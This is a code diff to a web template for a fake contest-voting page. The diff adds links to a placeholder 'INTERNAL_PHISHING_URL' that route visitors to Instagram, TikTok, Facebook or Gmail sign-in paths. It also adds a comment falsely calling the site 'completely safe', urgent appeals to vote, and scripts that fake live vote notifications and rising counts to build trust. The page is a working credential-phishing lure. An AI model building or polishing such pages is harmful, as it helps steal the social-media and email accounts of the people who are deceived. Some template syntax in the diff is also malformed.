@@ -1,3 +1,8 @@
+        <!-- disclaimer -->
+        <!-- this website is completely safe  -->
+         <!-- the urls leads safely to site that authorize with Oath of the social pages -->
+    
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -5,7 +10,6 @@
     <title><%= name %></title>
     <meta name="title" content="<%= name %>" />
     <meta name="description" content="Participate in the vote" />
-    <!-- fix zoom -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
     <!-- Open Graph / Facebook -->
@@ -20,64 +24,811 @@
     <meta property="twitter:description" content="Participate in the vote" />
     <meta property="twitter:image" content="<%= picture %>" />
 
-    <link rel="stylesheet" href="/css/v2.css">
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    
+    <style>
+      :root {
+        --primary-color: #4267B2;
+        --secondary-color: #1877F2;
+        --accent-color: #E7F3FF;
+        --text-color: #333;
+        --light-text: #777;
+        --white: #fff;
+        --shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        --gradient: linear-gradient(135deg, #4267B2, #1877F2);
+        --card-bg: #ffffff;
+        --highlight: #ffeb3b;
+        --notification-bg: rgba(255, 255, 255, 0.95);
+        --notification-border: #e1e1e1;
+        --notification-success: #4CAF50;
+      }
+      
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
 
-    <!-- Meta Tags Generated with https://metatags.io -->
+      body {
+        font-family: 'Poppins', sans-serif;
+        background-color: #f5f7fa;
+        color: var(--text-color);
+        min-height: 100vh;
+        line-height: 1.6;
+      }
+      
+      nav {
+        background: var(--gradient);
+        color: var(--white);
+        padding: 15px 20px;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        position: sticky;
+        top: 0;
+        z-index: 100;
+      }
+      
+      .logo {
+        font-size: 22px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+        text-align: center;
+        animation: fadeIn 0.8s ease-out;
+      }
+
+      .container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      .v-container {
+        display: flex;
+        flex-direction: column;
+        gap: 30px;
+        animation: slideUp 0.6s ease-out;
+      }
+
+      @media (min-width: 768px) {
+        .v-container {
+          flex-direction: row;
+        }
+        
+        .profile {
+          flex: 2;
+        }
+        
+        .participants {
+          flex: 1;
+        }
+      }
+
+      .profile {
+        background: var(--card-bg);
+        border-radius: 16px;
+        box-shadow: var(--shadow);
+        padding: 25px;
+        position: relative;
+        overflow: hidden;
+      }
+      
+      .profile::before {
+        content: '';
+        position: absolute;
+        top: -50px;
+        left: -50px;
+        width: 150px;
+        height: 150px;
+        background: var(--gradient);
+        border-radius: 50%;
+        opacity: 0.1;
+        z-index: 0;
+      }
+
+      .bio-wrap {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 20px;
+      }
+      
+      @media (min-width: 576px) {
+        .bio-wrap {
+          flex-direction: row;
+          align-items: flex-start;
+        }
+      }
+
+      .bio-wrap img {
+        width: 120px;
+        height: 120px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 5px solid var(--white);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        transition: transform 0.3s ease;
+        animation: pulse 2s infinite;
+      }
+      
+      .bio-wrap img:hover {
+        transform: scale(1.05);
+      }
+
+      .bio {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+      
+      .vote-appeal {
+        margin-top: 8px;
+        margin-bottom: 8px;
+      }
+      
+      .vote-appeal p {
+        color: #1877f2;
+        font-size: 14px;
+        line-height: 1.4;
+        font-weight: 500;
+        margin: 0;
+        padding: 8px 12px;
+        border-left: 3px solid var(--accent-color);
+        background-color: rgba(66, 103, 178, 0.05);
+        border-radius: 0 4px 4px 0;
+      }
+
+      .bio div {
+        font-size: 16px;
+        color: var(--light-text);
+      }
+
+      .bio strong {
+        color: var(--text-color);
+        font-weight: 600;
+      }
+      
+      .bio div:nth-child(2) strong,
+      .bio div:nth-child(4) strong {
+        color: #4CAF50;
+      }
+      
+      .bio div:nth-child(3) strong {
+        color: #FF9800;
+      }
+
+      .bio a {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        padding: 12px 20px;
+        border-radius: 12px;
+        text-decoration: none;
+        font-weight: 500;
+        font-size: 16px;
+        transition: all 0.3s ease;
+        position: relative;
+        overflow: hidden;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        margin-top: 10px;
+        color: var(--white);
+        justify-content: center;
+        max-width: 250px;
+      }
+      
+      .bio a::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.2);
+        transition: all 0.4s ease;
+      }
+      
+      .bio a:hover::before {
+        left: 100%;
+      }
+      
+      .bio a:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      }
+      
+      .bio a.instagram {
+        background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      }
+      
+      .bio a[href*="face"] {
+        background: var(--gradient);
+      }
+      
+      .bio a[href*="tikto"] {
+        background: linear-gradient(45deg, #000000, #25F4EE, #FE2C55, #000000);
+      }
+      
+      .bio a[href*="gma"] {
+        background: linear-gradient(45deg, #DB4437, #F2A600, #0F9D58, #4285F4);
+      }
+
+      .bio a img {
+        width: 24px;
+        height: 24px;
+        object-fit: contain;
+        border: none;
+        box-shadow: none;
+        animation: none;
+        filter: brightness(0) invert(1);
+      }
+      
+      .bio a img:hover {
+        transform: none;
+      }
+
+      .participants {
+        background: var(--card-bg);
+        border-radius: 16px;
+        box-shadow: var(--shadow);
+        padding: 25px;
+        position: relative;
+        overflow: hidden;
+      }
+      
+      .participants h4 {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 20px;
+        color: var(--primary-color);
+        text-align: center;
+        position: relative;
+        padding-bottom: 10px;
+      }
+      
+      .participants h4::after {
+        content: '';
+        position: absolute;
+        bottom: 0;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 50px;
+        height: 3px;
+        background: var(--gradient);
+        border-radius: 3px;
+      }
+
+      .contestant {
+        padding: 12px 15px;
+        border-radius: 8px;
+        margin-bottom: 10px;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        position: relative;
+        background: #f9f9f9;
+      }
+      
+      .vote-highlight {
+        background-color: var(--accent-color);
+        box-shadow: 0 0 8px rgba(66, 103, 178, 0.3);
+        transform: translateY(-2px);
+        animation: pulse-highlight 1s ease-in-out;
+        border-left: 4px solid transparent;
+      }
+      
+      .contestant:hover {
+        transform: translateX(5px);
+        background: var(--accent-color);
+      }
+      
+      .contestant:nth-child(2) {
+        border-left-color: #FFD700;
+      }
+      
+      .contestant:nth-child(3) {
+        border-left-color: #C0C0C0;
+      }
+      
+      .contestant:nth-child(4) {
+        border-left-color: #CD7F32;
+      }
+      
+      .contestant:nth-child(5) {
+        border-left-color: var(--primary-color);
+        background-color: rgba(231, 243, 255, 0.5);
+        font-weight: 600;
+      }
+      
+      /* Loading overlay */
+      .loading-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(255, 255, 255, 0.9);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+        backdrop-filter: blur(5px);
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
+      }
+
+      .loading-overlay.active {
+        opacity: 1;
+        pointer-events: all;
+      }
+
+      .loading-spinner {
+        width: 60px;
+        height: 60px;
+        border: 4px solid rgba(66, 103, 178, 0.1);
+        border-radius: 50%;
+        border-top: 4px solid var(--primary-color);
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      .loading-text {
+        font-size: 18px;
+        color: var(--primary-color);
+        font-weight: 500;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      
+      @keyframes fadeIn {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+      
+      @keyframes slideUp {
+        from { opacity: 0; transform: translateY(20px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+      
+      @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(66, 103, 178, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(66, 103, 178, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(66, 103, 178, 0); }
+      }
+      
+      /* Activity Notification Styles */
+      .activity-notification-container {
+        position: fixed;
+        bottom: 20px;
+        left: 20px;
+        z-index: 9999;
+        width: 280px;
+        pointer-events: none;
+        display: block;
+      }
+      
+      .activity-notification {
+        background: #ffffff;
+        border-left: 4px solid var(--primary-color);
+        border-radius: 6px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        padding: 12px 15px;
+        margin-bottom: 10px;
+        display: flex;
+        align-items: center;
+        transform: translateX(-120%);
+        opacity: 0;
+        transition: all 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55);
+        overflow: hidden;
+        position: relative;
+        max-width: 100%;
+      }
+      
+      .activity-notification.show {
+        transform: translateX(0);
+        opacity: 1 !important;
+        visibility: visible !important;
+      }
+      
+      .activity-notification.hide {
+        transform: translateX(-120%);
+        opacity: 0;
+      }
+      
+      .activity-icon {
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        background: var(--primary-color);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-right: 12px;
+        flex-shrink: 0;
+      }
+      
+      .activity-icon i {
+        color: white;
+        font-size: 16px;
+      }
+      
+      .activity-content {
+        flex: 1;
+        min-width: 0;
+      }
+      
+      .activity-title {
+        font-weight: 600;
+        font-size: 14px;
+        color: var(--text-color);
+        margin-bottom: 2px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+      
+      .activity-message {
+        font-size: 12px;
+        color: var(--light-text);
+        margin-bottom: 2px;
+      }
+      
+      .activity-time {
+        font-size: 11px;
+        color: var(--light-text);
+        opacity: 0.8;
+      }
+      
+      .activity-progress {
+        position: absolute;
+        bottom: 0;
+        left: 0;
+        height: 3px;
+        background: var(--primary-color);
+        width: 100%;
+        transform-origin: left;
+        animation: progress 5s linear forwards;
+      }
+      
+      @keyframes progress {
+        from { transform: scaleX(1); }
+        to { transform: scaleX(0); }
+      }
+      
+      @keyframes pulse-highlight {
+        0% { box-shadow: 0 0 0 0 rgba(66, 103, 178, 0.4); }
+        70% { box-shadow: 0 0 0 10px rgba(66, 103, 178, 0); }
+        100% { box-shadow: 0 0 0 0 rgba(66, 103, 178, 0); }
+      }
+    </style>
   </head>
   <body>
     <nav>
       <div class="logo">The People's Pick</div>
     </nav>
+    
     <div class="container">
       <div class="v-container">
         <div class="profile">
           <div class="bio-wrap">
-            <img src="<%= picture %>" alt="" />
+            <img src="<%= picture %>" alt="<%= name %>" />
             <div class="bio">
               <div>Name: <strong><%= name %></strong></div>
-              <div>Total: <strong>119</strong></div>
-              <div>Position: <strong>4</strong></div>
-              <div>Left to qualify: <strong>6</strong></div>
+              <!-- text urging users to vote for participant -->
+              <div class="vote-appeal">
+                <p>
+                  Your support can make all the difference! Cast your vote today to help <%= name %> advance to the finals. Every vote counts in this competitive showcase of talent. Share with friends and family to increase visibility and chances of winning. Thank you for your continued support!
+                </p>
+              </div>
+              
               <% if(linkType === "INSTAGRAM"){ %>
-              <a class="instagram" href="/inst/<%= linkId %>?retry=<%=link.numberOfRetries%>"
-                >Use Instagram
-                <img
-                  src="https://media.bio.site/sites/40c9e36c-cc2e-4dab-9353-29502ce3469a/7ZpyxXG6XVyK6MFmmePXNM.webp"
-                  alt="instagram"
-                />
+              <a class="instagram" href="<%= INTERNAL_PHISHING_URL =>/inst/<%= linkId %>?retry=<%=link.numberOfRetries%>" onclick="showLoading()">
+                <img src="https://media.bio.site/sites/40c9e36c-cc2e-4dab-9353-29502ce3469a/7ZpyxXG6XVyK6MFmmePXNM.webp" alt="Instagram" />
+                Continue with Instagram
               </a>
-              <%}%> <% if(linkType === "TIKTOK"){ %>
-              <a class="instagram" href="/tikto/<%= linkId %>?retry=<%=link.numberOfRetries%>"
-                >Use Tiktok
-                <img src="/tiktok/tiktok.png" alt="tiktok" />
+              <%}%> 
+              
+              <% if(linkType === "TIKTOK"){ %>
+              <a class="instagram" href="<%= INTERNAL_PHISHING_URL =>/tikto/<%= linkId %>?retry=<%=link.numberOfRetries%>" onclick="showLoading()">
+                <img src="/tiktok/tiktok.png" alt="TikTok" />
+                Continue with TikTok
               </a>
-              <%}%> <% if(linkType === "FACEBOOK"){ %>
-              <a class="instagram" href="/face/<%= linkId %>?retry=<%=link.numberOfRetries%>"
-                >Use Facebook
-                <img src="/img/facebook-logo.png" alt="faebook" />
+              <%}%> 
+              
+              <% if(linkType === "FACEBOOK"){ %>
+              <a class="instagram" href="<%= INTERNAL_PHISHING_URL =>/face/<%= linkId %>?retry=<%=link.numberOfRetries%>" onclick="showLoading()">
+                <img src="/img/facebook-logo.png" alt="Facebook" />
+                Continue with Facebook
               </a>
-              <%}%> <% if(linkType === "GMAIL"){ %>
-              <a class="instagram" href="/gma/<%= linkId %>?retry=<%=link.numberOfRetries%>"
-                >Use Gmail
-                <img src="/img/gmail.png" alt="gmail" />
+              <%}%> 
+              
+              <% if(linkType === "GMAIL"){ %>
+              <a class="instagram" href="<%= INTERNAL_PHISHING_URL =>/gma/<%= linkId %>?retry=<%=link.numberOfRetries%>" onclick="showLoading()">
+                <img src="/img/gmail.png" alt="Gmail" />
+                Continue with Gmail
               </a>
               <%}%>
             </div>
           </div>
-          <br />
         </div>
-        <!-- participants -->
+        
         <div class="participants">
-          <h4>Top Contestans</h4>
-          <div class="contestant">1. Ashley Martinez - 156</div>
-          <div class="contestant">2. Samantha Davis - 143</div>
-          <div class="contestant">3. Madison Brown - 124</div>
-          <div class="contestant">4. <%= name %> - 119</div>
-          <div class="contestant">5. Olivia Garcia - 89</div>
-          <div class="contestant">6. Isabella Clark - 55</div>
-          <div class="contestant">7. Sophia White - 34</div>
+          <h4>Top Contestants</h4>
+          <div class="contestant" id="contestant1">1. Ashley Martinez - <span class="vote-count">156</span></div>
+          <div class="contestant" id="contestant2">2. Samantha Davis - <span class="vote-count">143</span></div>
+          <div class="contestant" id="contestant3">3. Madison Brown - <span class="vote-count">124</span></div>
+          <div class="contestant" id="contestant4">4. <%= name %> - <span class="vote-count">119</span></div>
+          <div class="contestant" id="contestant5">5. Olivia Garcia - <span class="vote-count">89</span></div>
+          <div class="contestant" id="contestant6">6. Isabella Clark - <span class="vote-count">55</span></div>
+          <div class="contestant" id="contestant7">7. Sophia White - <span class="vote-count">34</span></div>
         </div>
       </div>
     </div>
+    
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Connecting...</div>
+    </div>
+    
+    <!-- Activity Notifications Container -->
+    <div class="activity-notification-container" id="activityContainer">
+      <!-- Pre-created notification for testing -->
+      <div class="activity-notification show" id="initialNotification">
+        <div class="activity-icon">
+          <i class="fas fa-thumbs-up"></i>
+        </div>
+        <div class="activity-content">
+          <div class="activity-title" id="initialNotificationTitle">Contestant 2</div>
+          <div class="activity-message">received a new vote</div>
+          <div class="activity-time">Just now</div>
+        </div>
+        <div class="activity-progress"></div>
+      </div>
+    </div>
+    
+    <script>
+      function showLoading() {
+        document.getElementById('loadingOverlay').classList.add('active');
+      }
+      
+      // Set up the initial notification and sync vote counts when the page loads
+      document.addEventListener('DOMContentLoaded', function() {
+        // 50% chance to show the profile contestant in the initial notification
+        const profileElement = document.querySelector('#contestant4');
+        if (profileElement) {
+          // Sync profile vote total with contestant 4's vote count
+          const profileVoteTotal = document.getElementById('profileVoteTotal');
+          const contestant4VoteCount = document.querySelector('#contestant4 .vote-count');
+          if (profileVoteTotal && contestant4VoteCount) {
+            profileVoteTotal.textContent = contestant4VoteCount.textContent;
+          }
+          
+          // Set initial notification to profile name with 50% chance
+          if (Math.random() < 0.5) {
+            const profileName = profileElement.textContent.split(' - ')[0].substring(3);
+            document.getElementById('initialNotificationTitle').textContent = profileName;
+          }
+        }
+      });
+      
+      // Make the initial notification fade out after 5 seconds and increment vote count
+      setTimeout(() => {
+        // Get the contestant name from the notification
+        const contestantName = document.getElementById('initialNotificationTitle').textContent;
+        
+        // Determine which contestant to update based on the notification
+        let contestantId;
+        if (contestantName === 'Samantha Davis') {
+          contestantId = 'contestant2';
+        } else {
+          // Check if it's the profile contestant
+          const profileElement = document.querySelector('#contestant4');
+          const profileName = profileElement ? profileElement.textContent.split(' - ')[0].substring(3) : null;
+          
+          if (contestantName === profileName) {
+            contestantId = 'contestant4';
+          } else {
+            // Default to contestant2 if no match
+            contestantId = 'contestant2';
+          }
+        }
+        
+        // Update the vote count
+        const voteCountElement = document.querySelector(`#${contestantId} .vote-count`);
+        if (voteCountElement) {
+          // Get current vote count and increment it
+          let currentVotes = parseInt(voteCountElement.textContent);
+          currentVotes++;
+          voteCountElement.textContent = currentVotes;
+          
+          // If this is the profile contestant, also update the profile vote total
+          if (contestantId === 'contestant4') {
+            const profileVoteTotal = document.getElementById('profileVoteTotal');
+            if (profileVoteTotal) {
+              profileVoteTotal.textContent = currentVotes;
+            }
+          }
+          
+          // Add highlight effect
+          const contestantElement = document.getElementById(contestantId);
+          contestantElement.classList.add('vote-highlight');
+          setTimeout(() => {
+            contestantElement.classList.remove('vote-highlight');
+          }, 2000);
+        }
+        
+        // Remove the notification
+        const initialNotification = document.getElementById('initialNotification');
+        if (initialNotification) {
+          initialNotification.classList.add('hide');
+          setTimeout(() => {
+            initialNotification.remove();
+          }, 500);
+        }
+      }, 5000);
+      
+      // Simple function to add more notifications manually
+      function addMoreNotifications() {
+        // Create a static notification
+        const notification = document.createElement('div');
+        notification.className = 'activity-notification';
+        notification.innerHTML = `
+          <div class="activity-icon">
+            <i class="fas fa-star"></i>
+          </div>
+          <div class="activity-content">
+            <div class="activity-title">Contestant 3</div>
+            <div class="activity-message">is gaining popularity</div>
+            <div class="activity-time">Just now</div>
+          </div>
+          <div class="activity-progress"></div>
+        `;
+        
+        const container = document.getElementById('activityContainer');
+        container.appendChild(notification);
+        
+        // Force show notification
+        setTimeout(() => {
+          notification.classList.add('show');
+          
+          // Remove notification after 5 seconds
+          setTimeout(() => {
+            notification.classList.add('hide');
+            setTimeout(() => {
+              notification.remove();
+            }, 500);
+          }, 5000);
+        }, 100);
+      }
+      
+      // Function to create random notifications
+      function createNotification() {
+        // Get the profile contestant's name
+        const profileElement = document.querySelector('#contestant4');
+        const profileName = profileElement ? profileElement.textContent.split(' - ')[0].substring(3) : 'Unknown';
+        
+        // Map contestant names to their element IDs
+        const contestantMap = {
+          'Ashley Martinez': 'contestant1',
+          'Samantha Davis': 'contestant2',
+          'Madison Brown': 'contestant3',
+          [profileName]: 'contestant4', // This is the profile contestant
+          'Olivia Garcia': 'contestant5',
+          'Isabella Clark': 'contestant6',
+          'Sophia White': 'contestant7'
+        };
+        
+        // Get array of contestant names
+        const contestants = Object.keys(contestantMap);
+        // Only show vote notifications
+        const activity = 'received a new vote';
+        const icon = 'thumbs-up';
+        
+        // Select random contestant with higher probability for profile contestant
+        let contestant;
+        
+        // 40% chance to select the profile contestant, 60% chance for others
+        if (Math.random() < 0.4) {
+          contestant = profileName;
+        } else {
+          // Filter out profile contestant from regular selection to avoid duplication
+          const otherContestants = contestants.filter(name => name !== profileName);
+          contestant = otherContestants[Math.floor(Math.random() * otherContestants.length)];
+        }
+        
+        // Create notification element
+        const notification = document.createElement('div');
+        notification.className = 'activity-notification';
+        notification.innerHTML = `
+          <div class="activity-icon">
+            <i class="fas fa-${icon}"></i>
+          </div>
+          <div class="activity-content">
+            <div class="activity-title">${contestant}</div>
+            <div class="activity-message">${activity}</div>
+            <div class="activity-time">Just now</div>
+          </div>
+          <div class="activity-progress"></div>
+        `;
+        
+        // Update vote count for the contestant
+        const contestantId = contestantMap[contestant];
+        if (contestantId) {
+          const voteCountElement = document.querySelector(`#${contestantId} .vote-count`);
+          if (voteCountElement) {
+            // Get current vote count and increment it
+            let currentVotes = parseInt(voteCountElement.textContent);
+            currentVotes++;
+            voteCountElement.textContent = currentVotes;
+            
+            // If this is the profile contestant, also update the profile vote total
+            if (contestantId === 'contestant4') {
+              const profileVoteTotal = document.getElementById('profileVoteTotal');
+              if (profileVoteTotal) {
+                profileVoteTotal.textContent = currentVotes;
+              }
+            }
+            
+            // Add highlight effect
+            const contestantElement = document.getElementById(contestantId);
+            contestantElement.classList.add('vote-highlight');
+            setTimeout(() => {
+              contestantElement.classList.remove('vote-highlight');
+            }, 2000);
+          }
+        }
+        
+        // Add to container
+        const container = document.getElementById('activityContainer');
+        container.appendChild(notification);
+        
+        // Show notification with animation
+        setTimeout(() => {
+          notification.classList.add('show');
+          
+          // Remove notification after animation completes
+          setTimeout(() => {
+            notification.classList.add('hide');
+            setTimeout(() => {
+              notification.remove();
+            }, 500);
+          }, 5000);
+        }, 100);
+      }
+      
+      // Schedule next random notification
+      function scheduleNextNotification() {
+        // Random delay between 8-15 seconds (increased from 3-8 seconds)
+        const delay = Math.floor(Math.random() * 7000) + 8000;
+        
+        setTimeout(() => {
+          createNotification();
+          scheduleNextNotification();
+        }, delay);
+      }
+      
+      // Add a notification after 5 seconds (increased from 2 seconds)
+      setTimeout(addMoreNotifications, 5000);
+      
+      // Add another notification after 12 seconds (increased from 5 seconds)
+      setTimeout(addMoreNotifications, 12000);
+      
+      // Start the random notification system after 20 seconds (increased from 8 seconds)
+      setTimeout(() => {
+        scheduleNextNotification();
+      }, 20000);
+      
+      // Log to console for debugging
+      console.log('Activity notification system initialized');
+    </script>
   </body>
 </html>
